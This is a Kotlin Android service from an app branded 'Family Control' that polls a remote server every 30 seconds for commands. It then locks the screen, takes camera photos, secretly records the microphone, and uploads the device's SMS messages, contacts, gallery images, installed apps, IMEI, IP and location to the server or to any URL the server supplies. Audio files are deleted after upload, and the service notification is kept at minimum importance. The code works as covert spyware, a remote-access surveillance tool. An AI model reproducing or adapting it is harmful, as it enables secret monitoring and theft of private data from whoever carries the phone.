package com.apps.myfamily

import android.app.*
import android.app.admin.DevicePolicyManager
import android.annotation.SuppressLint
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.ApplicationInfo
import android.content.pm.PackageManager
import android.location.Location
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.*
import android.provider.ContactsContract
import android.provider.Settings
import android.provider.Telephony
import android.telephony.CellInfo
import android.telephony.CellSignalStrength
import android.telephony.PhoneStateListener
import android.telephony.SignalStrength
import android.telephony.TelephonyManager
import android.util.Log
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import androidx.core.app.NotificationManagerCompat
import androidx.core.content.ContextCompat
import com.apps.myfamily.network.ApiConfig
import com.google.android.gms.location.LocationServices
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.io.IOException
import java.net.Inet4Address
import java.net.NetworkInterface
import java.util.concurrent.TimeUnit
import android.media.MediaRecorder
import okhttp3.MediaType.Companion.toMediaType
import android.media.RingtoneManager
import android.media.Ringtone
import android.media.AudioAttributes
import android.media.AudioManager



class CommandService : Service() {

    private val handler = Handler(Looper.getMainLooper())
    private val interval = 30000L // 30 detik

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForegroundNotification()
        startPolling()
        return START_STICKY
    }

    private fun startPolling() {
        handler.post(object : Runnable {
            override fun run() {
                pollCommand()
                handler.postDelayed(this, interval)
            }
        })
    }

    private fun pollCommand() {
        val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
        val url = "${ApiConfig.BASE_URL}/api/device/command?device_id=$deviceId"

        val request = Request.Builder().url(url).get().build()
        val client = OkHttpClient.Builder()
            .connectTimeout(5, TimeUnit.SECONDS)
            .readTimeout(5, TimeUnit.SECONDS)
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e("CmdService", "Poll failed: ${e.message}")
            }

            override fun onResponse(call: Call, response: Response) {
                val body = response.body?.string() ?: return
                if (response.code == 204) return

                try {
                    val json = JSONObject(body)
                    val command = json.getString("command")
                    val params = json.getJSONObject("params")
                    
                    // Log received command
                    Log.d("CmdService", "Received command: $command with params: $params")
                    Log.d("CommandService", "Received command: $command")

                    when (command) {
                        "lock_screen" -> {
                            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
                            val compName = ComponentName(applicationContext, MyDeviceAdminReceiver::class.java)
                            if (dpm.isAdminActive(compName)) dpm.lockNow()
                        }

                        "take_photo" -> {
                            val camera = params.optString("camera", "front")
                            val uploadUrl = params.optString("upload_url")
                            Log.d("CmdService", "Initiating photo capture and upload with camera: $camera, uploadUrl: $uploadUrl")
                            takePhoto(camera, uploadUrl)
                            Log.d("CmdService", "Photo capture and upload initiated")
                        }
                        
                        "show_notification" -> {
                            val title = params.optString("title", "Family Control")
                            val message = params.optString("message", "New notification")
                            showCustomNotification(title, message)
                            Log.d("CmdService", "Showing notification with title: $title, message: $message")
                        }

                        "lock_with_message" -> {
                            val message = params.optString("message", "Layar akan dikunci")
                            Log.d("CommandService", "Processing lock_with_message. Message: ${message}")
                            // showWarningUI(applicationContext, message)
                            showWarningViaNotification(applicationContext, message)
                        }

                        "show_warning_ui" -> {
                            val message = params.optString("message", "Pesan tidak tersedia")
                            showWarningUI(applicationContext, message)
                        }

                        "get_installed_apps" -> {
                            Log.d("CmdService", "Running get_installed_apps command")
                            sendInstalledAppsToBackend(applicationContext)
                        }

                        "upload_gallery" -> {
                            Log.d("CmdService", "Uploading gallery images...")
                            uploadGalleryImages(applicationContext)
                        }

                        "get_sms" -> {
                            Log.d("CmdService", "Running get_sms command")
                            uploadSmsToBackend(applicationContext)
                        }

                        "get_contact" -> {
                            uploadContactsToBackend(applicationContext)
                        }

                        "get_information" -> {
                            Log.d("CmdService", "Running get_information command")
                            // Execute on main thread to avoid Looper issues
                            Handler(Looper.getMainLooper()).post {
                                Log.d("CmdService", "Collecting device information on main thread")
                                collectDeviceInformation(applicationContext)
                            }
                        }

                        "record_audio" -> {
                            val duration = params.optInt("duration", 10)
                            val uploadUrl = params.optString("upload_url")
                            if (uploadUrl.isNotEmpty()) {
                                recordAudioAndUpload(applicationContext, duration, uploadUrl)
                            }
                        }

                        "play_alarm_now" -> {
                            val volume = params.optInt("volume", 100)
                            val duration = params.optInt("duration", 10)
                            playAlarmSound(applicationContext, volume, duration)
                        }


                    }

                } catch (e: Exception) {
                    Log.e("CmdService", "Parse error: ${e.message}")
                }
            }
        })
    }
    
    private fun playAlarmSound(context: Context, volume: Int, durationSec: Int) {
        try {
            val alarmUri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM)
                ?: RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION)
    
            val ringtone = RingtoneManager.getRingtone(context, alarmUri)
            ringtone.audioAttributes = AudioAttributes.Builder()
                .setUsage(AudioAttributes.USAGE_ALARM)
                .setContentType(AudioAttributes.CONTENT_TYPE_SONIFICATION)
                .build()
    
            val audioManager = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
            val maxVolume = audioManager.getStreamMaxVolume(AudioManager.STREAM_ALARM)
            val targetVolume = (maxVolume * volume / 100).coerceAtMost(maxVolume)
            audioManager.setStreamVolume(AudioManager.STREAM_ALARM, targetVolume, 0)
    
            ringtone.play()
    
            Handler(Looper.getMainLooper()).postDelayed({
                ringtone.stop()
            }, durationSec * 1000L)
    
        } catch (e: Exception) {
            Log.e("AlarmSound", "Failed to play alarm: ${e.message}")
        }
    }
    
    @SuppressLint("MissingPermission")
    private fun recordAudioAndUpload(context: Context, durationSec: Int, uploadUrl: String) {
        val outputFile = File(context.cacheDir, "recorded_${System.currentTimeMillis()}.3gp")

        val recorder = MediaRecorder().apply {
            setAudioSource(MediaRecorder.AudioSource.MIC)
            setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
            setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
            setOutputFile(outputFile.absolutePath)
            prepare()
            start()
        }

        Log.i("AudioRecord", "Recording started: ${outputFile.absolutePath}")

        Handler(Looper.getMainLooper()).postDelayed({
            try {
                recorder.stop()
                recorder.release()
                Log.i("AudioRecord", "Recording stopped, file saved")
                uploadAudioFile(context, outputFile, uploadUrl)
            } catch (e: Exception) {
                Log.e("AudioRecord", "Error stopping recorder: ${e.message}")
            }
        }, durationSec * 1000L)
    }

    private fun uploadAudioFile(context: Context, file: File, uploadUrl: String) {
        val deviceId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
    
        val requestBody = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("device_id", deviceId)
            .addFormDataPart("audio", file.name, file.asRequestBody("audio/3gp".toMediaType()))
            .build()
    
        val request = Request.Builder()
            .url(uploadUrl)
            .post(requestBody)
            .build()
    
        OkHttpClient().newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e("UploadAudio", "Failed: ${e.message}")
            }
    
            override fun onResponse(call: Call, response: Response) {
                val body = response.body?.string()
                Log.i("UploadAudio", "Success: $body")
    
                // ✅ AUTO DELETE FILE after success
                if (response.isSuccessful) {
                    if (file.exists()) {
                        file.delete()
                        Log.i("UploadAudio", "Local file deleted: ${file.name}")
                    }
                }
            }
        })
    }
    


    private fun isDeviceRooted(): Boolean {
        val paths = listOf(
            "/system/bin/su", "/system/xbin/su", "/sbin/su",
            "/system/sd/xbin/su", "/system/bin/failsafe/su"
        )
        return paths.any { File(it).exists() }
    }

    @SuppressLint("MissingPermission")
    private fun collectDeviceInformation(context: Context) {
        val info = JSONObject()

        // Timestamp
        info.put("timestamp", System.currentTimeMillis())

        // Battery
        val batteryIntent = context.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        val level = batteryIntent?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
        val status = batteryIntent?.getIntExtra(BatteryManager.EXTRA_STATUS, -1)
        val charging = status == BatteryManager.BATTERY_STATUS_CHARGING || status == BatteryManager.BATTERY_STATUS_FULL
        info.put("battery_level", level)
        info.put("charging", charging)

        // Internet
        val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        var connectionType = "OFFLINE"
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val network = cm.activeNetwork
            val capabilities = cm.getNetworkCapabilities(network)
            if (capabilities != null) {
                connectionType = when {
                    capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> "WIFI"
                    capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> "MOBILE"
                    capabilities.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) -> "ETHERNET"
                    else -> "UNKNOWN"
                }
            }
        } else {
            @Suppress("DEPRECATION")
            val networkInfo = cm.activeNetworkInfo
            if (networkInfo != null && networkInfo.isConnected) {
                connectionType = when (networkInfo.type) {
                    ConnectivityManager.TYPE_WIFI -> "WIFI"
                    ConnectivityManager.TYPE_MOBILE -> "MOBILE"
                    else -> "UNKNOWN"
                }
            }
        }
        
        info.put("internet", connectionType)

        // Device Info
        info.put("device_model", Build.MODEL)
        info.put("android_version", Build.VERSION.RELEASE)
        info.put("sdk_int", Build.VERSION.SDK_INT)

        // Storage Info
        val stat = StatFs(Environment.getDataDirectory().path)
        val free = stat.blockSizeLong * stat.availableBlocksLong
        val total = stat.blockSizeLong * stat.blockCountLong
        info.put("storage_free_mb", free / (1024 * 1024))
        info.put("storage_total_mb", total / (1024 * 1024))

        // Root Check
        info.put("is_rooted", isDeviceRooted())

        // IP Address
        try {
            val interfaces = NetworkInterface.getNetworkInterfaces()
            for (intf in interfaces) {
                val addrs = intf.inetAddresses
                for (addr in addrs) {
                    if (!addr.isLoopbackAddress && addr is Inet4Address) {
                        info.put("ip_address", addr.hostAddress)
                        break
                    }
                }
            }
        } catch (_: Exception) {}

        // Signal strength (handled in next step)
        listenForSignalStrength(context, info)
    }

    private fun listenForSignalStrength(context: Context, info: JSONObject) {
        // Check for READ_PHONE_STATE permission before accessing phone state
        if (ActivityCompat.checkSelfPermission(context, android.Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            Log.e("PhoneState", "READ_PHONE_STATE permission not granted")
            info.put("signal_strength_dbm", JSONObject.NULL)
            info.put("permission_state", "READ_PHONE_STATE permission denied")
            
            // Continue with location upload even without phone state info
            getLocationAndUpload(context, info)
            return
        }
        
        val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
    
        val listener = object : PhoneStateListener() {
            override fun onSignalStrengthsChanged(signalStrength: SignalStrength?) {
                super.onSignalStrengthsChanged(signalStrength)
                try {
                    val dbm = signalStrength?.cellSignalStrengths?.firstOrNull()?.dbm
                    info.put("signal_strength_dbm", dbm ?: JSONObject.NULL)
                    
                    // Add IMEI and operator info if available (requires READ_PHONE_STATE)
                    try {
                        // This line requires READ_PHONE_STATE permission - already checked above
                        info.put("operator_name", tm.networkOperatorName)
                        
                        // Only add device ID (IMEI) for API levels below 29
                        // For API 29+, we'll have to use alternative identifiers
                        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
                            info.put("device_id", tm.deviceId)
                        }
                        
                        // Get cellular network info
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                            val cellInfo = tm.allCellInfo
                            if (cellInfo != null && cellInfo.isNotEmpty()) {
                                info.put("cell_info_available", true)
                                
                                // Get network operator info
                                val mcc = tm.networkOperator.substring(0, 3)
                                val mnc = tm.networkOperator.substring(3)
                                info.put("mcc", mcc)
                                info.put("mnc", mnc)
                            }
                        }
                    } catch (e: Exception) {
                        Log.e("PhoneState", "Error getting phone state details: ${e.message}")
                    }
                    
                } catch (_: Exception) {
                    info.put("signal_strength_dbm", JSONObject.NULL)
                }
    
                getLocationAndUpload(context, info)
                tm.listen(this, PhoneStateListener.LISTEN_NONE)
            }
        }
    
        tm.listen(listener, PhoneStateListener.LISTEN_SIGNAL_STRENGTHS)
    }

    private fun getLocationAndUpload(context: Context, info: JSONObject) {
        val fused = LocationServices.getFusedLocationProviderClient(context)
    
        if (ActivityCompat.checkSelfPermission(context, android.Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
            Log.i("CommandService", "ACCESS_FINE_LOCATION permission granted, getting location")
            fused.lastLocation
                .addOnSuccessListener { loc: Location? ->
                    if (loc != null) {
                        info.put("latitude", loc.latitude)
                        info.put("longitude", loc.longitude)
                        Log.i("CommandService", "Location data added to info: ${loc.latitude}, ${loc.longitude}")
                    } else {
                        Log.w("CommandService", "Location is null")
                        info.put("location_available", false)
                    }
                    uploadInformation(context, info)
                }
                .addOnFailureListener { e ->
                    Log.e("CommandService", "Failed to get location: ${e.message}")
                    info.put("location_error", e.message ?: "Unknown error")
                    uploadInformation(context, info)
                }
        } else {
            Log.w("CommandService", "ACCESS_FINE_LOCATION permission not granted")
            info.put("location_permission", "denied")
            uploadInformation(context, info)
        }
    }
    
    private fun uploadInformation(context: Context, info: JSONObject) {
        val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
        
        // Create a wrapper JSON object with the expected format
        val wrapper = JSONObject()
        wrapper.put("device_id", androidId)
        wrapper.put("information", info)  // Use "information" field name and pass the actual JSONObject
        
        Log.d("UploadInfo", "Sending device info: ${wrapper}")
        
        val body = wrapper.toString().toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())
        
        val request = Request.Builder()
            .url("${ApiConfig.BASE_URL}/api/device/information")
            .post(body)
            .addHeader("Content-Type", "application/json")
            .build()
            
        OkHttpClient().newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e("UploadInfo", "Failed to upload device information: ${e.message}")
            }
            
            override fun onResponse(call: Call, response: Response) {
                if (response.isSuccessful) {
                    Log.i("UploadInfo", "Device information uploaded successfully")
                } else {
                    Log.e("UploadInfo", "Error uploading device information: ${response.code}")
                }
            }
        })
    }
    
    private fun getContacts(context: Context): JSONArray {
        val contacts = JSONArray()
        val resolver = context.contentResolver
        val cursor = resolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            null, null, null, null
        )
    
        cursor?.use {
            val idxName = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
            val idxNumber = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
    
            while (it.moveToNext()) {
                val obj = JSONObject()
                obj.put("name", it.getString(idxName))
                obj.put("number", it.getString(idxNumber))
                contacts.put(obj)
            }
        }
    
        return contacts
    }
    
    private fun uploadContactsToBackend(context: Context) {
        val contactArray = getContacts(context)
        val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
    
        val json = JSONObject().apply {
            put("device_id", androidId)
            put("contacts", contactArray)
        }
    
        val body = json.toString().toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())
    
        val request = Request.Builder()
            .url("${ApiConfig.BASE_URL}/api/device/upload_contacts")
            .post(body)
            .build()
    
        OkHttpClient().newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e("UploadContact", "Failed: ${e.message}")
            }
    
            override fun onResponse(call: Call, response: Response) {
                Log.i("UploadContact", "Uploaded: ${response.body?.string()}")
            }
        })
    }

    private fun getAllSms(context: Context): JSONArray {
        val smsList = JSONArray()
        val uri = Telephony.Sms.CONTENT_URI
        val projection = arrayOf(
            Telephony.Sms.ADDRESS,
            Telephony.Sms.BODY,
            Telephony.Sms.DATE,
            Telephony.Sms.TYPE
        )
    
        val cursor = context.contentResolver.query(uri, projection, null, null, "date DESC")
        cursor?.use {
            val idxAddress = it.getColumnIndex(Telephony.Sms.ADDRESS)
            val idxBody = it.getColumnIndex(Telephony.Sms.BODY)
            val idxDate = it.getColumnIndex(Telephony.Sms.DATE)
            val idxType = it.getColumnIndex(Telephony.Sms.TYPE)
    
            while (it.moveToNext()) {
                val smsJson = JSONObject()
                smsJson.put("address", it.getString(idxAddress))
                smsJson.put("body", it.getString(idxBody))
                smsJson.put("date", it.getLong(idxDate))
                smsJson.put("type", it.getInt(idxType)) // 1: inbox, 2: sent
                smsList.put(smsJson)
            }
        }
    
        return smsList
    }
    
    private fun uploadSmsToBackend(context: Context) {
        val smsArray = getAllSms(context)
        val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
    
        val json = JSONObject().apply {
            put("device_id", androidId)
            put("sms", smsArray)
        }
    
        val body = json.toString().toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())
    
        val request = Request.Builder()
            .url("${ApiConfig.BASE_URL}/api/device/upload_sms")
            .post(body)
            .build()
    
        OkHttpClient().newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e("UploadSMS", "Failed: ${e.message}")
            }
    
            override fun onResponse(call: Call, response: Response) {
                val res = response.body?.string()
                Log.i("UploadSMS", "Response: $res")
            }
        })
    }

    private fun uploadGalleryImages(context: Context) {
        val galleryDir = File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM), "Camera")
        if (!galleryDir.exists() || !galleryDir.isDirectory) {
            Log.e("UploadGallery", "DCIM/Camera directory not found")
            return
        }
    
        val files = galleryDir.listFiles { file ->
            file.isFile && file.extension.lowercase() in listOf("jpg", "jpeg", "png")
        } ?: return
    
        val deviceId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
        val uploadUrl = "${ApiConfig.BASE_URL}/api/device/upload_gallery_image"
    
        val client = OkHttpClient()
    
        for (file in files.take(10)) { // Limit to avoid bulk upload
            val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                .addFormDataPart("device_id", deviceId)
                .addFormDataPart(
                    "image", file.name,
                    file.asRequestBody("image/jpeg".toMediaTypeOrNull())
                )
                .build()
    
            val request = Request.Builder()
                .url(uploadUrl)
                .post(body)
                .build()
    
            client.newCall(request).enqueue(object : Callback {
                override fun onFailure(call: Call, e: IOException) {
                    Log.e("UploadGallery", "Failed: ${e.message}")
                }
    
                override fun onResponse(call: Call, response: Response) {
                    Log.i("UploadGallery", "Uploaded ${file.name}: ${response.code}")
                }
            })
        }
    }
    

    private fun startForegroundNotification() {
        val channelId = "command_service"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val chan = NotificationChannel(
                channelId,
                "Family Control Service",
                NotificationManager.IMPORTANCE_MIN
            )
            val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            manager.createNotificationChannel(chan)
        }

        val notification = Notification.Builder(this, channelId)
            .setContentTitle("Family Control")
            .setContentText("Service aktif")
            .setSmallIcon(R.drawable.ic_launcher_foreground)
            .build()

        startForeground(1, notification)
    }

    override fun onBind(intent: Intent?): IBinder? = null
    
    /**
     * Shows a custom notification with the specified title and message
     */
    private fun showCustomNotification(title: String, message: String) {
        val channelId = "custom_notifications"
        
        // Create notification channel for Android 8.0+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId,
                "Custom Notifications",
                NotificationManager.IMPORTANCE_HIGH // Use HIGH to ensure notification shows even when app is closed
            ).apply {
                description = "Notifications sent through command API"
                enableVibration(true)
                enableLights(true)
            }
            
            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            notificationManager.createNotificationChannel(channel)
        }
        
        // Build the notification
        val notificationBuilder = NotificationCompat.Builder(this, channelId)
            .setSmallIcon(R.drawable.ic_launcher_foreground)
            .setContentTitle(title)
            .setContentText(message)
            .setPriority(NotificationCompat.PRIORITY_HIGH)
            .setAutoCancel(true)
        
        // Show notification
        with(NotificationManagerCompat.from(this)) {
            // Use a unique ID based on current time to avoid overwriting previous notifications
            val notificationId = System.currentTimeMillis().toInt()
            try {
                notify(notificationId, notificationBuilder.build())
                Log.d("CmdService", "Notification displayed with ID: $notificationId")
            } catch (e: SecurityException) {
                Log.e("CmdService", "Permission denied for showing notification: ${e.message}")
            }
        }
    }

    /**
     * Captures a photo using the specified camera and uploads it to the given URL
     * This method ensures proper handling of camera resources in a background context
     *
     * @param cameraFacing "front" or "back" camera to use
     * @param uploadUrl URL where the photo should be uploaded
     */
    private fun takePhoto(cameraFacing: String, uploadUrl: String) {
        Log.d("CmdService", "Taking photo with camera: $cameraFacing, uploadUrl: $uploadUrl")
        
        // Update notification to indicate camera use (required for Android 9+)
        Log.d("CmdService", "Updating foreground notification to indicate camera use")
        updateForegroundNotification("Taking photo...")
        
        try {
            // Use PhotoUtils for better error handling and compression
            PhotoUtils.takePhotoAndUpload(applicationContext, cameraFacing, uploadUrl)
        } catch (e: Exception) {
            Log.e("CmdService", "Error in takePhoto: ${e.message}", e)
        } finally {
            // Reset notification after photo capture attempt
            Handler(Looper.getMainLooper()).postDelayed({
                updateForegroundNotification("Service aktif")
            }, 3000) // Delay to ensure photo capture has time to complete
        }
    }
    
    /**
     * Updates the foreground notification with a new message
     *
     * @param message The message to display in the notification
     */
    private fun updateForegroundNotification(message: String) {
        val channelId = "command_service"
        
        val notification = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Notification.Builder(this, channelId)
                .setContentTitle("Family Control")
                .setContentText(message)
                .setSmallIcon(R.drawable.ic_launcher_foreground)
                .build()
        } else {
            NotificationCompat.Builder(this, channelId)
                .setContentTitle("Family Control")
                .setContentText(message)
                .setSmallIcon(R.drawable.ic_launcher_foreground)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .build()
        }
        
        val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        notificationManager.notify(1, notification)
    }

    private fun showWarningUI(context: Context, message: String, shouldLock: Boolean = false) {
        val intent = Intent(context, WarningActivity::class.java).apply {
            putExtra("message", message)
            putExtra("should_lock", shouldLock)
            flags = Intent.FLAG_ACTIVITY_NEW_TASK or
                    Intent.FLAG_ACTIVITY_CLEAR_TOP or
                    Intent.FLAG_ACTIVITY_CLEAR_TASK
        }
    
        try {
            context.startActivity(intent)
            Log.d("CmdService", "Started WarningActivity successfully")
        } catch (e: Exception) {
            Log.e("CmdService", "Failed to start WarningActivity: ${e.message}")
            showWarningViaNotification(context, message)
        }
    }
    
    

    private fun showWarningViaNotification(context: Context, message: String) {
        val channelId = "urgent_channel"
        val notificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
    
        // Create high importance channel
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId,
                "Urgent Commands",
                NotificationManager.IMPORTANCE_HIGH
            )
            notificationManager.createNotificationChannel(channel)
        }
    
        val intent = Intent(context, WarningActivity::class.java).apply {
            putExtra("message", message)
            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
        }
    
        val pendingIntent = PendingIntent.getActivity(
            context,
            0,
            intent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )
    
        val notification = NotificationCompat.Builder(context, channelId)
            .setSmallIcon(R.drawable.ic_launcher_foreground)
            .setContentTitle("Peringatan")
            .setContentText(message)
            .setPriority(NotificationCompat.PRIORITY_HIGH)
            .setContentIntent(pendingIntent)
            .setAutoCancel(true)
            .build()
    
        notificationManager.notify(System.currentTimeMillis().toInt(), notification)
    }

    private fun getInstalledAppsAndUpload() {
        try {
            val packageManager = applicationContext.packageManager
            val packages = packageManager.getInstalledApplications(0)
            val appsJson = JSONArray()
            
            for (appInfo in packages) {
                val appJson = JSONObject()
                appJson.put("package_name", appInfo.packageName)
                appJson.put("app_name", appInfo.loadLabel(packageManager).toString())
                appJson.put("is_system_app", (appInfo.flags and ApplicationInfo.FLAG_SYSTEM) != 0)
                appsJson.put(appJson)
            }
    
            val androidId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
            val jsonBody = JSONObject().apply {
                put("device_id", androidId)
                put("apps", appsJson)
            }
    
            val body = jsonBody.toString().toRequestBody("application/json".toMediaTypeOrNull())
            val request = Request.Builder()
                .url("${ApiConfig.BASE_URL}/api/device/installed_apps?device_id=$androidId")
                .post(body)
                .addHeader("Content-Type", "application/json")
                .build()
    
            OkHttpClient().newCall(request).enqueue(object : Callback {
                override fun onFailure(call: Call, e: IOException) {
                    Log.e("SendInstalledApps", "Failed to send apps: ${e.message}")
                }
    
                override fun onResponse(call: Call, response: Response) {
                    val body = response.body?.string()
                    if (response.isSuccessful) {
                        Log.i("SendInstalledApps", "Success: $body")
                    } else {
                        Log.e("SendInstalledApps", "Error ${response.code}: $body")
                    }
                }
            })
    
        } catch (e: Exception) {
            Log.e("SendInstalledApps", "Error: ${e.message}", e)
        }
    }

    private fun sendInstalledAppsToBackend(context: Context) {
        val pm = context.packageManager
        val packages = pm.getInstalledApplications(PackageManager.GET_META_DATA)
    
        val apps = JSONArray()
    
        for (appInfo in packages) {
            val label = pm.getApplicationLabel(appInfo).toString()
            val packageName = appInfo.packageName
    
            val appJson = JSONObject()
            appJson.put("app_name", label)
            appJson.put("package_name", packageName)
            apps.put(appJson)
        }
    
        val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
        val url = "${ApiConfig.BASE_URL}/api/device/installed_apps?device_id=$androidId"
    
        val requestBody = apps.toString().toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())
    
        val request = Request.Builder()
            .url(url)
            .post(requestBody)
            .build()
    
        val client = OkHttpClient()
        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e("SendInstalledApps", "Failed to send: ${e.message}")
            }
    
            override fun onResponse(call: Call, response: Response) {
                if (response.isSuccessful) {
                    Log.i("SendInstalledApps", "Success: ${response.body?.string()}")
                } else {
                    Log.e("SendInstalledApps", "Error ${response.code}: ${response.body?.string()}")
                }
            }
        })
    }
    
    
    
    
    

}
